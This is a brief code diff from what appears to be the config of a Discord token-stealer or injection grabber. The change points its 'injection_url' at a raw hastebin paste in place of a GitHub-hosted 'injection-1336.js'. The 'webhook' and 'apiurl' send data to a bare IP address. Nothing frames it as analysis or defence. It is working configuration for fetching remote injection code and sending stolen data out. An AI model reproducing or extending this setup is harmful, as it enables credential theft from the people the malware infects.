@@ -27,7 +27,7 @@ const config = {
     "init-notify": "true",
     "embed-color": 374276,
 
-    injection_url: "https://github.com/Nowze/1336Archive/blob/main/injection-1336.js",
+    injection_url: "https://hastebin.com/raw/amuretolut",
     webhook: "http://20.196.201.254/webhook/klew",
     apiurl: "http://20.196.201.254/webhook/klew",
     filter2: {
